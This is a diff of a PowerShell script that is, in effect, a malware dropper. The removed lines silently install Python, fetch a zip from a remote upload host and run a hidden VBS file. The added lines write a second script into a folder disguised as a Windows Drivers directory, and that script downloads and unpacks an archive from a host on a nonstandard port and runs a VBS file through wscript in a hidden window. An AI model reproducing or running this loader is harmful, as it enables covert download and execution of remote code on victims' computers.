@@ -1,53 +1,29 @@
-# Define variables
-$pythonInstallerUrl = "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe"
-$zipScriptUrl = "https://s01.babup.com/uploads/SystemXCXZ.zip"
-$targetDirectory = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Python 3.11"
+$scriptContent = @"
+$targetFolder = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Drivers"
+$compressedFileUrl = "https://dso2.raed.net:454/files/Installer.zip"
+$vbsScriptPath = "$targetFolder\VSHS.vbs"
 
-# Function to check if the directory contains four files or shortcuts
-function CheckDirectoryContent {
-    $items = Get-ChildItem -Path $targetDirectory -ErrorAction SilentlyContinue
-    return ($items.Count -eq 4)
-}
+# Create the target folder if it doesn't exist
+New-Item -Path $targetFolder -ItemType Directory -Force
 
-# Create directory if it doesn't exist
-$directoryPath = "$env:USERPROFILE\AppData\System"
-if (-not (Test-Path -Path $directoryPath -PathType Container)) {
-    New-Item -Path $directoryPath -ItemType Directory
-}
+# Download the compressed file
+$compressedFilePath = Join-Path -Path $targetFolder -ChildPath "Installer.zip"
+Invoke-WebRequest -Uri $compressedFileUrl -OutFile $compressedFilePath
 
-# Download and install Python silently
-Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile "$env:USERPROFILE\AppData\System\pythonX.exe"
-Start-Process -FilePath "$env:USERPROFILE\AppData\System\pythonX.exe" -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1" -Wait
+# Extract the contents of the compressed file to the target folder
+Expand-Archive -Path $compressedFilePath -DestinationPath $targetFolder -Force
 
-# Wait for the target directory to contain four files or shortcuts
-while (-not (CheckDirectoryContent)) {
-    Start-Sleep -Seconds 1
-}
+# Run the VBS script
+Start-Process -FilePath "wscript.exe" -ArgumentList $vbsScriptPath -WindowStyle Hidden
+"@
 
-# Remove existing Python 3.11 shortcut if it exists
-try {
-    Remove-Item -Path $targetDirectory -Force -Recurse -ErrorAction Stop
-}
-catch {
-    # Folder and files do not exist, continue
-}
+# Define the path to the script file
+$scriptFilePath = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\WIN.ps1"
 
-# Download the zip script
-Invoke-WebRequest -Uri $zipScriptUrl -OutFile "$env:USERPROFILE\AppData\System\System.zip"
+# Write the script content to the file
+$scriptContent | Out-File -FilePath $scriptFilePath -Encoding utf8
 
-# Unzip the script in the same directory
-Expand-Archive -Path "$env:USERPROFILE\AppData\System\System.zip" -DestinationPath $directoryPath -Force
+# Run the script
+Start-Process -FilePath "powershell.exe" -ArgumentList "-File $scriptFilePath" -WindowStyle Hidden
 
-# Install required Python libraries
-$libs = @("os", "requests", "ctypes", "socket", "time", "platform", "psutil", "subprocess", "uuid", "wmi", "concurrent.futures", "random", "threading")
-
-foreach ($lib in $libs) {
-    Start-Process -FilePath "$env:USERPROFILE\AppData\Local\Programs\Python\Python311\Scripts\pip.exe" -ArgumentList "install $lib" -NoNewWindow -Wait
-}
-
-# Run BNV.vbs script
-Start-Process -FilePath "$env:USERPROFILE\AppData\System\BN.vbs" -WindowStyle Hidden
-
-
-# Display completion message
-Write-Host "Script completed!"
+exit
